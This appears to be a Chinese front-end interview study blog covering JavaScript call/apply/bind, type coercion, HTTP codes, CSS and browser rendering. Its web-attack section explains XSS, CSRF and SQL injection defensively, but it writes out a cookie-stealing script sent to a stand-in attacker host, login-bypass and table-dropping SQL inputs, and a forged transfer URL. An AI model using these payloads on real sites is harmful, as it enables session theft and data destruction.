接收一个数组对象set.size // 56// 类似于const set = new Set();document .querySelectorAll('div') .forEach(div =&gt; set.add(div));set.size // 56 Set 的属性或方法属性： Set.prototype.constructor：构造函数，默认就是 Set 函数。 Set.prototype.size：返回 Set 实例的成员总数。 方法： 操作方法 add(value)：添加某个值，返回 Set 结构本身。 delete(value)：删除某个值，返回一个布尔值，表示删除是否成功。 has(value)：返回一个布尔值，表示该值是否为 Set 的成员。 clear()：清除所有成员，没有返回值。 遍历方法 [Symbol.iterator]()： 返回键值的遍历器 keys()：返回键名的遍历器。 values()：返回键值的遍历器。 entries()：返回键值对的遍历器。 forEach()：使用回调函数遍历每个成员。123456789101112131415161718192021222324252627let set = new Set(['red', 'green', 'blue']);for (let item of set.keys()) &#123; console.log(item);&#125;// red// green// bluefor (let item of set.values()) &#123; console.log(item);&#125;// red// green// bluefor (let item of set.entries()) &#123; console.log(item);&#125;// ["red", "red"]// ["green", "green"]// ["blue", "blue"]set.forEach((key, value) =&gt; console.log(key + ' : ' + value)); // key = value// red : red// green : green// blue : blue Set 和 Object 判断是否有某个Key的对比 1234567891011121314151617181920// 对象的写法const properties = &#123; 'width': 1, 'height': 1&#125;;if (properties[someName]) &#123; // do something&#125;// Set的写法const properties = new Set();properties.add('width');properties.add('height');if (properties.has(someName)) &#123; // do something&#125; call和apply的区别本质：改变 this 的指向12345678910// apply()方法：调用一个对象的一个方法，用另一个对象替换当前对象。// 例如：B.apply(A, arguments); 即A对象应用B对象的方法。func.apply(thisObj[, argArray]); // 2个参数，参数2为数组// call()方法：调用一个对象的一个方法，用另一个对象替换当前对象。// 例如：B.call(A, args1,args2); 即A对象调用B对象的方法。func.call(thisObj[, arg1[, arg2[, [, ...argN]]]]); // 多个参数，其他参数为非数组// 参数1 thisObj 是可选的。在 func 函数运行时使用的 this 值。请注意，this 可能不是该方法看到的实际值：如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动替换为指向全局对象(window)，原始值会被包装。 1、举例用途1：获取数组中最大最小值123// apply会将参数2的数组装换成一个个的参数，如将下例中的[1, 2, 3, 4]转换成1, 2, 3, 4.Math.max.apply(null, [1, 2, 3, 4]); // 参数1可写成null、undefined、this、Math、windowMath.min.apply(null, [1, 2, 3, 4]); 2、举例用途2：拼接数组12345678var arr1 = new Array("1", "2", "3");var arr2 = new Array("4", "5", "6");Array.prototype.push.apply(arr1, arr2); // 返回数组长度 6arr1.push.apply(arr1, arr2); // arr1: ["1", "2", "3", "4", "5", "6"], arr1对象调用Array的push方法// 上面的等同于arr1.push(...arr2); // ES6语法arr1.concat(arr2); // ES5语法 3、举例3：面试题12345678910111213// 实现一个log方法，传入不定的参数，内部打印出console.log()日志// es6function log (...args) &#123; console.log(...args);&#125;// es5function log() &#123; // arguments输出的是一个数组，...arguments等到的是不定参数 console.log.apply(this, arguments);&#125;log(1, 2, 3, 4); 1.) console.log 挂载在 window 下2.) this 的指向需要看上下文，一开始 this 指向 window3.) 使用 apply 将log方法中 this 指向 widnow 变成指向 console4.) 参数1本例中可以使用 null、undefined、this、window、console，他表示在 console.log 运行时的 this 指向 4、严格模式 + 非严格模式12345'use strict'function fn( a, b )&#123; console.log( this )&#125;fn(1, 2) 1.) 严格模式下 this 指向 undefined2.) 非严格模式下 this 会被转成全局的 window call、apply、bind 参考：博客园 call,apply,bind call 、apply 、bind 是 Function 对象自带的三个方法，都是为了改变函数体内部 this 的指向；call 、apply 、bind 三者第一个参数都是 this 要指向的对象，也就是想指定的上下文；call 、apply 、bind 三者都可以利用后续参数传参；bind 是返回对应 函数，需要手动调用；apply 、call 则是立即调用。 举例 123456789101112function fruits() &#123;&#125;fruits.prototype = &#123; color: 'red', say: function() &#123; console.log('My color is ' + this.color); &#125;&#125;;var apple = new fruits; // 不传参时括号可以省略apple.say(); // 此时方法里面的 this 指的是 fruits// 结果： My color is red 如果我们有一个对象 banana = {color : &#39;yellow&#39;} ,我们不想重新定义 say 方法，那么我们可以通过 call 或 apply 来使用 apple 的 say 方法： 12345678910111213var banana = &#123; color: 'yellow'&#125;;apple.say.call(banana); // 此时的 this 的指向已经同过 call() 方法改变了，指向的是 banana// 结果： My color is yellowapple.say.apply(banana); // 此时的 this 的指向已经同过 apply() 方法改变了，指向的是 banana// 结果： My color is yellow// 如果参数传nullapple.say.apply(null); // 因为 null 是 window 下的，所以此时 this 指向了 window// 结果： My color is undefined call、apply传参 12345678910111213141516171819202122232425var arr1 = [1, 2, 3, 4, 5];var arr2 = [6, 7, 8, 9, 10];var arr3 = [11, 12, 13, 14, 15];var str = '16';// 第一种：Array.prototype.push.apply(arr1, arr2); // 10console.log(arr1); // [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]Array.prototype.push.call(arr1, arr2); // 6console.log(arr1); // [1, 2, 3, 4, 5, [6, 7, 8, 9, 10]]// 第二种：Array.prototype.push.apply(arr1, arr2, arr3); // 10console.log(arr1); // [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]Array.prototype.push.call(arr1, arr2, arr3); // 7console.log(arr1) // [1, 2, 3, 4, 5, [6, 7, 8, 9, 10], [11, 12, 13, 14, 15]]// 第三种：Array.prototype.push.apply(arr1, str);console.log(arr1); // Uncaught TypeError: CreateListFromArrayLike called on non-objectArray.prototype.push.call(arr1, str); // 6console.log(arr1); // [1, 2, 3, 4, 5, "21"] call 参数可以传多个，从第二个参数开始，call 会把他们当成一个元素，和它们本身的类型无关，call 的参数都是事先就知道的 apply 参数可以传两个，且第二个参数必须使用 Array，apply 的参数可以是不定的（第二个参数内不定） call 和 apply 唯一的区别就是参数不同， call 可以传多个参数，apply 只能传两个且第二个是数组 bind方法 bind方法会创建一个新函数，称之为绑定函数。当调用这个绑定函数时，绑定函数会将创建它时传入 bind() 方法的第一个参数作为 this，传入 bind() 方法的第二个及以后的参数加上绑定函数运行时本身的参数按照顺序作为原函数的参数来调用原函数。 123456789101112var bar = function()&#123; console.log(this.x);&#125;;var foo = &#123; x:3&#125;;bar(); // undefinedvar func = bar.bind(foo); // 将foo对象绑定给bar，此时this会指向foo. 但是用bind() 方法并不会立即执行，而是创建一个新函数，如果要直接调用的话，可以 bar.bind(foo)();func(); // 3 在 JavaScript 中，多次使用 bind() 是无效的。bind() 的实现相当于在内部包了一个 call 或 apply，第二次 bind() 相当于再包住第一次 bind()，所有第二次以后的 bind() 是无法生效的。 123456789101112var bar = function()&#123; console.log(this.x);&#125;;var foo = &#123; x:3&#125;;var sed = &#123; x:4&#125;;var func = bar.bind(foo).bind(sed); // 使用两次bind()func(); // 3 第二次以后的bind()是无效的 call、apply、bind异同 123456789101112var obj = &#123; x: 5,&#125;; var foo = &#123; getX: function() &#123; return this.x; &#125;&#125;console.log(foo.getX.bind(obj)()); // 5console.log(foo.getX.call(obj)); // 5console.log(foo.getX.apply(obj)); // 5 如何选用 如果不需要关心具体有多少参数传入函数，选用 apply(); 如果确定函数可以接受多少个参数，并且想一目了然的知道形参和实参的的对应关系，选用 call(); 如果不需要立即执行，将来手动调用时，选用 bind()(); 手动模拟实现call、apply、bind 参考：简书 手动实现call, apply, bind 模拟前须知 首先我们知道，对象上的方法，在调用时，this 是指向对象的。 123456let o = &#123; fn:function()&#123; console.log(this); &#125;&#125;o.fn() // Object &#123;fn: function&#125; 知道了这点，我们就可以实现改变 this 指向了 12345678// 函数原型上添加 myCall方法 来模拟callFunction.prototype.myCall = function(obj)&#123; //我们要让传入的obj成为, 函数调用时的this值. obj._fn_ = this; //在obj上添加_fn_属性，值是this(要调用此方法的那个函数对象)。 obj._fn_(); //在obj上调用函数,那函数的this值就是obj. delete obj._fn_; // 再删除obj的_fn_属性,去除影响. //_fn_ 只是个属性名 你可以随意起名，但是要注意可能会覆盖obj上本来就有的属性&#125; 测试： 123456789101112let test = &#123; name:'test'&#125;let o = &#123; name:'o', fn:function()&#123; console.log(this.name); &#125;&#125;o.fn() // "o"o.fn.call(test) // "test"o.fn.myCall(test) // "test" 模拟call2.1 es6 123456789101112131415161718192021222324252627282930Function.prototype.myCall = function(obj, ...arg)&#123; // 传参检测 if(obj === null || obj === undefined)&#123; obj = window; &#125; else &#123; obj = Object(obj); &#125; let val ; obj._fn_ = this; val = obj._fn_(...arg); //不能直接return obj._fn_(...arg) 这样就不delete属性了 delete obj._fn_; return val;&#125;//测试let test = &#123; name: 'test'&#125;let o = &#123; name:'o', fn: function() &#123; console.log(this.name, ...arguments); //这里把参数显示一下 &#125;&#125;o.fn(1, 2, 3) // "o" 1 2 3o.fn.call(test, 1, 2, 3) // "test" 1 2 3o.fn.myCall(test, 1, 2, 3) // "test" 1 2 3// 没问题 2.2 非es6 1234567891011Function.prototype.myCall = function(obj)&#123; let arg = []; let val ; for(let i = 1; i &lt; arguments.length; i++)&#123; arg.push( 'arguments[' + i + ']' ) ; &#125; obj._fn_ = this; val = eval( 'obj._fn_(' + arg + ')' ) delete obj._fn_; return val;&#125; 模拟apply3.1 es6 + myCall方法 12345678Function.prototype.myApply = function(obj, arr)&#123; let args = []; for(let i = 0; i &lt; arr.length; i++)&#123; args.push( arr[i] ); &#125; // 其实直接 ...arr 传参也可以 但是效果就和aplly有微小差别了 return this.myCall(obj, ...args);&#125; 3.2 非es6 + myCall方法 1234567Function.prototype.myApply = function(obj, arr)&#123; let args = []; for(let i = 0; i &lt; arr.length; i++)&#123; args.push( 'arr[' + i + ']' ); // 这里也是push 字符串 &#125; return eval( 'this.myCall(obj,' + args + ')' );&#125; 3.3 非es6 1234567891011Function.prototype.myApply = function(obj, arr)&#123; let args = []; let val ; for(let i = 0; i &lt; arr.length; i++)&#123; args.push( 'arr[' + i + ']' ) ; &#125; obj._fn_ = this; val = eval( 'obj._fn_(' + args + ')' ) delete obj._fn_; return val&#125; 模拟bind4.1 es6 + myApply方法 12345Function.prototype.myBind = function(obj,...arg1)&#123; //arg1收集剩余参数 return (...arg2) =&gt; &#123; //返回箭头函数, this绑定调用这个方法(myFind)的函数对象 return this.myApply( obj, arg1.concat(arg2) ); // 将参数合并 &#125;&#125; 4.2 es6 12345678910Function.prototype.myBind = function(obj, ...arg1)&#123; return (...arg2) =&gt; &#123; let args = arg1.concat(arg2); let val ; obj._fn_ = this; val = obj._fn_( ...args ); delete obj._fn_; return val &#125;&#125; 4.3 非es6 1234567891011121314151617181920Function.prototype.myFind = function(obj)&#123; let _this = this; let argArr = []; let arg1 = []; for(let i = 1; i &lt; arguments.length; i++)&#123; arg1.push( arguments[i] ); argArr.push( 'arg1[' + (i - 1) + ']' ) ; &#125; return function()&#123; let val ; for(let i = 0; i &lt; arguments.length; i++)&#123; argArr.push( 'arguments[' + i + ']' ) ; &#125; obj._fn_ = _this; console.log(argArr); val = eval( 'obj._fn_(' + argArr + ')' ) ; delete obj._fn_; return val; &#125;;&#125; 简述http工作原理原理常见的http状态码： 1XX系列：指定客户端应相应的某些动作，代表请求已被接受，需要继续处理。 2XX系列：代表请求已成功被服务器接收、理解、并接受。200(成功): 请求成功201(已创建): 请求成功并且服务器创建了新的资源202(已接受): 服务器已接受请求，但尚未处理 3XX系列：代表需要客户端采取进一步的操作才能完成请求，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的 Location 域中指明。300(多种选择): 针对请求，服务器可执行多种操作301(永久移动): 被请求的资源已永久移动到新位置302(临时移动): 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求 4XX系列：代表了客户端看起来可能发生了错误，妨碍了服务器的处理。400(错误请求): 服务器不理解请求的语法401(未授权): 请求要求身份验证403(拒绝): 服务器已经理解请求，但是拒绝执行它404(未找到): 服务器找不到请求的网页413(请求实体过大): 请求实体过大，服务器无法处理请求414(请求的URI过长): 请求的 URI（通常为网址）过长，服务器无法处理 5xx系列：代表了服务器在处理请求的过程中有错误或者异常状态发生。500(服务器内部错误): 服务器错误502(错误网关): 服务器作为网关或代理，从上游服务器收到无效响应505(HTTP版本不受支持): 服务器不支持请求中所用的 HTTP 协议版本 几种常见web攻击手段前端面试只需答 XSS 和 CSRF 两种 XSS(跨站脚本攻击) 概念全称是跨站脚本攻击（Cross Site Scripting），指攻击者在网页中嵌入恶意脚本程序。 案例比如说我写了一个博客网站，然后攻击者在上面发布了一个文章，内容是这样的&lt;script&gt;window.open(“www.gongji.com?param=”+document.cookie)&lt;/script&gt;,如果我没有对他的内容进行处理，直接存储到数据库，那么下一次当其他用户访问他的这篇文章的时候，服务器从数据库读取后然后响应给客户端，浏览器执行了这段脚本，然后就把该用户的cookie发送到攻击者的服务器了。 被攻击的原因用户输入的数据变成了代码，比如说上面的&lt;script&gt;,应该只是字符串却有了代码的作用。 预防将输入的数据进行转义处理，比如说讲 &lt; 转义成&amp;lt； CSRF(跨站请求伪造) 概念全称是跨站请求伪造(cross-site request forgery),指通过伪装成受信任用户的进行访问，通俗的讲就是说我访问了A网站，然后cookie存在了浏览器，然后我又访问了一个流氓网站，不小心点了流氓网站一个链接（向A发送请求），这个时候流氓网站利用了我的身份对A进行了访问。 案例1、这个例子可能现实中不会存在，但是攻击的方式是一样的。比如说我登录了A银行网站，此时存储了cookie。然后我又访问了另一个网站B，然后点了里面的一个链接 www.A.com/transfer?account=666&amp;money=10000。这个时候A没有校验该请求是B发起的，那么很可能就向账号为666的人转了1w。2、注意这个攻击方式不一定是我点了这个链接，也可以是这个网站里面一些资源请求指向了这个转账链接。 被攻击的原因用户本地存储cookie，攻击者利用用户的cookie进行认证，然后伪造用户发出请求。 预防1、之所以被攻击是因为攻击者利用了存储在浏览器用于用户认证的cookie，那么如果我们不用cookie来验证不就可以预防了。所以我们可以采用token（不存储于浏览器）认证。 2、通过referer识别，HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。那么这样的话，我们必须登录银行A网站才能进行转账了。 SQL注入 概念通过sql命令伪装成正常的http请求参数，传递到服务器端，服务器执行sql命令造成对数据库进行攻击。 案例1、&#39; or &#39;1&#39;= &#39;1。这是最常见的sql注入攻击，当我们输如用户名 jiajun ，然后密码输如 &#39;or &#39;1&#39;= &#39;1的时候，我们在查询用户名和密码是否正确的时候，本来要执行的是 select * from user where username=&#39;&#39; and password=&#39;&#39;,经过参数拼接后，会执行sql语句 select * from user where username=&#39;jaijun&#39; and password=&#39; &#39; or &#39;1&#39;=&#39;1&#39;，这个时候1=1是成立，自然就跳过验证了。 2、但是如果再严重一点，密码输入的是 &#39;;drop table user;--，那么sql命令为 select * from user where username=&#39;jiajun&#39; and password=&#39;&#39;;drop table user;--&#39; 这个时候我们就直接把这个表给删除了。 被攻击的原因sql语句伪造参数，然后在对参数进行拼接的后形成破坏性的sql语句，最后导致数据库受到攻击。 预防1、在java中，我们可以使用预编译语句(PreparedStatement)，这样的话即使我们使用sql语句伪造成参数，到了服务端的时候，这个伪造sql语句的参数也只是简单的字符，并不能起到攻击的作用。 2、很多orm框架已经可以对参数进行转义。 3、做最坏的打算，即使被’拖库‘(‘脱裤，数据库泄露’)。数据库中密码不应明文存储的，可以对密码使用md5进行加密，为了加大破解成本，所以可以采用加盐的（数据库存储用户名，盐（随机字符长），md5后的密文）方式。 DDOS 概念分布式拒绝服务攻击（Distributed Denial of Service），简单说就是发送大量请求是使服务器瘫痪。DDos攻击是在DOS攻击基础上的，可以通俗理解，dos是单挑，而ddos是群殴，因为现代技术的发展，dos攻击的杀伤力降低，所以出现了DDOS，攻击者借助公共网络，将大数量的计算机设备联合起来，向一个或多个目标进行攻击。 案例1、SYN Flood ,简单说一下tcp三次握手，客户端先服务器发出请求，请求建立连接，然后服务器返回一个报文，表明请求已被接受，然后客户端也会返回一个报文，最后建立连接。那么如果有这么一种情况，攻击者伪造ip地址，发出报文给服务器请求连接，这个时候服务器接受到了，根据tcp三次握手的规则，服务器也要回应一个报文，可是这个ip是伪造的，报文回应给谁呢，第二次握手出现错误，第三次自然也就不能顺利进行了，这个时候服务器收不到第三次握手时客户端发出的报文，又再重复第二次握手的操作。如果攻击者伪造了大量的ip地址并发出请求，这个时候服务器将维护一个非常大的半连接等待列表，占用了大量的资源，最后服务器瘫痪。 2、CC攻击，在应用层http协议上发起攻击，模拟正常用户发送大量请求直到该网站拒绝服务为止。 被攻击的原因服务器带宽不足，不能挡住攻击者的攻击流量。 预防1、最直接的方法增加带宽。但是攻击者用各地的电脑进行攻击，他的带宽不会耗费很多钱，但对于服务器来说，带宽非常昂贵。2、云服务提供商有自己的一套完整DDoS解决方案，并且能提供丰富的带宽资源。 [‘1’, ‘2’, ‘3’].map(parseInt);结果：[1, NaN, NaN] 考察知识点：map和parseInt map传递两个参数：Array.map(element, index, array) parseInt传递两个参数：parseInt(string, radix)参数radix表示进制数，2~36，如果不设置或为0，则默认取10进制转换，如果小于0、等于1或大于36，则返回NaN 原题先转换成：123456789101112131415['1', '2', '3'].map(function (element) &#123; return `$&#123;element&#125;`; // ["1", "2", "3"]&#125;);['1', '2', '3'].map(function (element, index) &#123; return `$&#123;element&#125;-$&#123;index&#125;`; // ["1-0", "2-1", "3-2"]&#125;);['1', '2', '3'].map(function (element, index, array) &#123; return `$&#123;element&#125;-$&#123;index&#125;-$&#123;array&#125;`; // ["1-0-1,2,3", "2-1-1,2,3", "3-2-1,2,3"]&#125;);['1', '2', '3'].map(function (element, index, array, other) &#123; return `$&#123;element&#125;-$&#123;index&#125;-$&#123;array&#125;-$&#123;other&#125;`; // ["1-0-1,2,3-undefined", "2-1-1,2,3-undefined", "3-2-1,2,3-undefined"]&#125;); 由此可以也可以看出，map的参数最多3个。原题先求执行 map ，然后再执行括号中的 parseInt，parseInt 接收的参数是 map 中的 element 和 index所以原题再转换成：123456789parseInt('1', 0); // 1parseInt('2', 1); // NaN，因为没有1进制parseInt('3', 2); // NaN，虽然有二进制，但是2进制中没有3// 同理parseInt('4', 3)parseInt('5', 4)parseInt('6', 5)['1', '2', '3', '4', '5', '6'].map(parseInt); // [1, NaN, NaN, NaN, NaN, NaN] 同理123456[10, 10, 10].map(parseInt) // [10, NaN, 2]function add (num1, num2) &#123; return num1 + num2&#125;[1, 2, 3].map(add) // [1, 3, 5] []==false 为什么为 true，!![]==false 为什么为 false, [] == ![] 为什么为 true segmentfaultjs隐式转换： 数字 == 字符串 =&gt; 数字 == 数字 数字 == 布尔值 =&gt; 数字 == 数字 字符串 == 布尔值 =&gt; 数字 == 数字 对象 == 布尔值 =&gt; 对象 == 数字 对象 == 数字 =&gt; 字符串 == 数字 1234567891011121314151617[] == false; // true!![] == false; // false'' == false; // true;!!'' == false; // true'' == 0; // true!!'' == 0; // true[1] == '1'; // truenull == 0; // falsenull == false; // falsenull == ''; // falsenull == undefined; // true0 == false; // true1 == true; // true2 == true; // false [] == false 转换过程如下： [] == false; // 对象和布尔值，如果有布尔值，先将布尔值转换成数字如果其中一个操作数为布尔类型，那么布尔操作数如果为true，那么会转换为1，如果为false，会转换为整数0，即0。 [] == 0; // 原值和非原值，把非原值转换成原值，toString()方法如果一个对象与数字或字符串相比较，JavaScript会尝试返回对象的默认值。操作符会尝试通过方法valueOf和toString将对象转换为其原始值（一个字符串或数字类型的值）。如果尝试转换失败，会产生一个运行时错误。注意：当且仅当与原始值比较时，对象会被转换为原始值。当两个操作数均为对象时，它们作为对象进行比较，仅当它们引用相同对象时返回true ‘’ == 0; // 字符串和数字，把字符串转换成数字，Number()方法当比较数字和字符串时，字符串会转换成数字值。 JavaScript 尝试将数字字面量转换为数字类型的值。 首先, 一个数学上的值会从数字字面量中衍生出来，然后这个值将被转为一个最接近的Number类型的值。 0 == 0; !![] == false 转换过程如下： 非运算符优先级大于 ==，先执行![] // !对象 返回 false !false = true !!’’ == false 转换过程如下： 非运算符优先级大于 ==，先执行!’’ // !空字符串 返回 true、!非空字符串 返回 false !true = false [] == ![] 为true的转换过程如下： 转换成原始值（toString方法） ‘’ == false 转换成数字和数字 0 == 0 注意：当且仅当与原始值比较时，对象会被转换为原始值。当两个操作数均为对象时，它们作为对象进行比较，仅当它们引用相同对象时返回true字符串对象的类型是对象，不是字符串！12345678910111213141516var a = new String('javascript') // typeof a === 'object'var b = new String('javascript')a == 'javascript' // truea === 'javascript' // falseb == 'javascript' // trueb === 'javascript' // falsea === b // falsea == b // falsevar a = String('javascript') // typeof a === 'string'var b = String('javascript')a === b // truea == b // true 效果如下： 123456789var a = &#123;&#125;var b = &#123;&#125;var c = aa == b // falsea === b // falsea == c // truea == c // true// a、b为引用类型，判断时看引用的地址，a、b地址不同，a、c地址相同 什么情况下满足 a==1 &amp;&amp; a==121234var a = ???;if(a == 1 &amp;&amp; a == 12)&#123; console.log(a);&#125; 分析：变量a要同时满足==1和==12两个条件，需要实现这种情况，a在执行第一次的时候必然会进行动态改变 解：1234567891011121314151617181920// 数字的原型上有valueOf、toString等方法，此例中需要重写 a.valueOf 方法var a = &#123; i: 1, valueOf () &#123; if (this.i === 1) &#123; this.i++ // 取完值后就不再=1了 return 1 &#125; else &#123; return 12 &#125; &#125;&#125;if(a == 1 &amp;&amp; a == 12)&#123; console.log(a);&#125;// 如果一个对象与数字或字符串相比较，JavaScript会尝试返回对象的默认值。操作符会尝试通过方法valueOf和toString将对象转换为其原始值（一个字符串或数字类型的值）。如果尝试转换失败，会产生一个运行时错误。// 每次执行 a == x 的时候，都是使用 valueOf 和 toString 来对a进行转换// 第一次 执行 a == 1，执行a.valueOf，执行了a+1，且返回1，所以=true// 第二次 执行 a == 12，执行a.valueOf，返回12，所以=true 今日头条CSS面试题css布局实现以下要求（主要考察css布局、padding设置为百分比时的参照物）： 1.子级div左右距离父级边界各50px 2.子级div垂直居中 3.子级div高度是宽度的一半 注：css margin、padding的left、right、top、bottom设置为百分比时都是以父级的width为参照 123&lt;div class="outer"&gt; &lt;div class="inner"&gt;ABCD&lt;/div&gt;&lt;/div&gt; 123456789101112131415161718192021222324252627282930.outer&#123; /* 父级内部实现水平、垂直居中 */ display: flex; align-items: center; justify-content: center; border: 5px solid #f00; width:400px; height: 300px; /* 需求1：子级左右距离父级边距各50px（先不实现这个，最后实现） */ padding: 0 50px;&#125;.inner&#123; border: 5px solid #0f0; color: #000; font-size: 20px; /* 需求2：子级内部实现水平、垂直居中 */ display: flex; align-items: center; justify-content: center; flex: 1; /* 需求3：子级内部高度为父级宽度的一半 */ padding: 25% 0; /* 设置height: 0, 防止文字增加高度 */ height:0;&#125; 注：当不实现 需求1 的时候，需求3 中自己内部高度为50%，即为父级（outer div）宽度的一半，此时由于inner div设置了flex布局（需求2），导致子级宽度和父级宽度一样，最后再实现 需求1，父级增加左右padding。 效果如下： 今日头条算法推导题假设在今日头条里面，有很多工作人员检查新闻是不是属于虚假新闻，所有新闻真实率到达了98%，工作人员在检验一个真实的新闻把它检验为一个虚假的新闻的概率为2%，而一个虚假的新闻被检验为真实的新闻的概率为5%. 那么，一个被检验为真实的新闻确实是真实的新闻的概率是多大? A.0.9991 B.0.9989 C.0.9855 D.0.96 答案:B 分析条件得到：真的新闻：98%，包含 真的-&gt;真的，假的-&gt;假的假的新闻：2%，包含 真的-&gt;假的，假的-&gt;真的 因为：真的-&gt;假的：2%假的-&gt;真的：5% 所以：真的-&gt;真的：1 - 2% = 98%假的-&gt;假的：1 - 5% = 95% 分析要求：被检验为真实的新闻确实是真实的新闻 首先要明确被检验为真实的新闻包括了（本来是真的和本来是假的）所以分子为（真-&gt;真），分母为（真-&gt;真 + 假-&gt;真） 结果为：（真-&gt;真）/（真-&gt;真 + 假-&gt;真） = (98%(1-2%)) / (98%(1-2%) + 2%*5%) = 0.9604/0.9614 = 0.9989…… 阿里钉钉面试题 排除数组指定内容(考察filter用法) 12345678910111213141516171819202122/*** 说明：实现一个exclude方法，从数组中排除掉指定内容* 示例：* exclude([1, 2, 'a', 2], 2); // 返回 [1, 'a']* exclude([1, 'a', 2, 'a'], 1, 'a'); // 返回 [2]* exclude([1, 2, 3]); // 返回 [1, 2, 3]*/function exclude(arr, ...param) &#123; // 注：不定参数用...param表示，param是数据对象，无该参数时表示空数组 // 额外拓展：arguments囊括所以的参数 // arguments: 可以取到不定参数的具体内容, // 如 exclude([1, 2, 'a', 2], 2) 则输出[[1, 2, 'a', 2], 2] // 如 exclude([1, 'a', 2, 'a'], 1, 'a') 则输出[[1, 2, 'a', 2], 1, 'a'] // arguments.length 表示参数的个数，这样可以取到不定参数的个数 /* 代码实现 */ return arr.filter((item, index, self) =&gt; &#123; return !param.includes(item); // 注filter return语句中为true则保留，为false则去除 &#125;);&#125; 字符频率统计（考察sort方法、字符串charCodeAt方法） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/** * 说明：给定一个字符串，将字符串里的字符按照出现的频率升序排列并统计输出。 * 1. 字符串的字符只有小写字母 * 2. 输出格式是字符+频次，如 aaaa 输出 a4 * 3. 升序排序优先按频次排序，频次相同时按字母升序排序，如 ccbbabaa 输出 c2a3b3 * 示例： * frequency('dabhppa'); // 输出 b1d1h1a2p2 * frequency('cb'); // 输出 b1c1 * frequency('accabcb'); // 输出 a2b2c3*/ // 只考虑按字符顺序输出：frequency('dabhppa'); 输出 a2b1d1h1p2function frequency(chars) &#123; /* 代码实现 */ // 思路涉及到排序先想到sort方法，但是sort方法时Array的方法，所以想到先将字符串使用split('')转成数组，用sort()排序后再用join()方法转成字符串 // 第一步：排序 var sortChars = chars.split('').sort((a, b) =&gt; &#123; return a.charCodeAt() - b.charCodeAt(); &#125;).join(''); // 这样操作之后会得到已排序好的字符 // 第二步：收集key value let obj = &#123;&#125;; for (let i = 0; i &lt; sortChars.length; i += 1) &#123; if (obj[sortChars[i]]) &#123; obj[sortChars[i]]++; &#125; else &#123; obj[sortChars[i]] = 1; &#125; &#125; console.log(obj); // 第三步：输出 let str = ''; for (var key in obj) &#123; str += `$&#123;key&#125;$&#123;obj[key]&#125;`; &#125; console.log(str); return str&#125;// 真实实现，先按数量再按字符输出：frequency('helloworld'); 输出 l3o2d1e1h1r1w1function frequency(chars) &#123; // char = 'helloworld' var arr = char .split('') // ['h', 'e', 'l', 'l', 'o', 'w', 'o', 'r', 'l', 'd'] .sort() // ['d', 'e', 'h', 'l', 'l', 'l', 'o', 'o', 'r', 'w'] .join('') // dehllloorw .match(/([a-z])\1*/g) // ['d', 'e', 'h', 'lll', 'oo', 'r', 'w'] .sort(function (a, b) &#123; return b.length - a.length &#125;) // ['lll', 'oo', 'd', 'e', 'h', 'r', 'w'] let str = '' for (let i in arr) &#123; str += `$&#123;arr[i][0]&#125;$&#123;arr[i].length&#125;` &#125; return str&#125; 面试题：js连续赋值运算描述下面的结果，为什么？12345var a = &#123;n: 1&#125;;b = a;a.x = a = &#123;n: 2&#125;;console.log(a, b); // &#123;n: 2&#125;、&#123;n: 1, x: &#123;n: 2&#125;&#125; 参考：https://blog.csdn.net/dcof99817/article/details/102343098 注意点： 赋值运算符（”=”）是自右向左的。 字段访问运算符（”.”）优先级 &gt; 赋值运算符。 解析： .运算符优先级最大，先执行 a.x ，此时a指向 {n: 1}，称之为A对象。 a中没有x属性，所以 a.x 为undefined，即a指向 {n: 1, x: undefined}。由于a、b共用存储地址，所以b也指向 {n: 1, x: undefined}。 开始赋值运算，自右向左先执行 a = {n: 2}。在堆中创建对象B，即 {n: 2}，a新指向了对象B，b暂未改变。 再执行 a.x = a，由于一开始js已经先计算了 a.x，便已经解析了这个 a.x 是对象A的x，所以在同一条公式的情况下再回来给 a.x 赋值，也不会说重新解析这个 a.x 为对象B的x。相当于把对象A的x属性指向了对象B。导致 b = {n: 1, x: {n: 2}}，a未改变 a = {n: 2} 页面渲染机制与性能优化浏览器渲染过程 什么是DOCTYPE及作用DTD(document type definitiion，文档类型定义)是一系列的语法规则，用来定义 XML 或 (X)HTML的文件类型。浏览器会使用它来判断文档类型，决定使用何种协议来解析，以及切换浏览器模式。DOCTYPE 是用来申明文档类型和 DTD 规范的，一个主要的用途是文件的合法性验证。如果文件代码不合法，那么浏览器解析时会出一些错。指示 web 浏览器关于页面使用哪个 HTML 版本进行编写的指令。 html5 1&lt;!DOCTYPE html&gt; html4.01 Strict该 DTD 包含所有 HTML 元素和属性，但不包括展示性的和弃用的元素（比如 font）。不允许框架集（Framesets）。 1&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt; html4.01 Transitional该 DTD 包含所有 HTML 元素和属性，包括展示性的和弃用的元素（比如 font）。不允许框架集（Framesets）。 12 &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt; html4.01 Frameset该 DTD 包含所有 HTML 元素和属性，但不包括展示性的和弃用的元素（比如 font）。允许框架集（Framesets）。 12 &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd"&gt; 网页请求过程(输入url开始发生了什么)输入url回车 –&gt; 解析url –&gt; DNS解析 –&gt; 建立TCP链接(三次握手) –&gt; 客户端发起请求 –&gt; 服务端响应请求 –&gt; 渲染页面 –&gt; 断开连接 浏览器渲染过程 参考：segmentfault 浏览器渲染过程 webkit渲染过程图 gecko渲染过程图 这两个内核的渲染流程大同小异，主要的过程可以总结为下列5个： DomTree: 解析html构建DOM树。 CssomTree: 解析CSS生成CSSOM规则树。 RenderObjectTree: 将DOM树与CSSOM规则树合并在一起生成渲染对象树。 Layout: 遍历渲染树开始布局(layout)，计算每个节点的位置大小信息。 Painting: 将渲染树每个节点绘制到屏幕。 重排（回流）Reflow重排一定会触发重绘，而重绘不一定会重排 参考：segmentfault 浏览器渲染过程 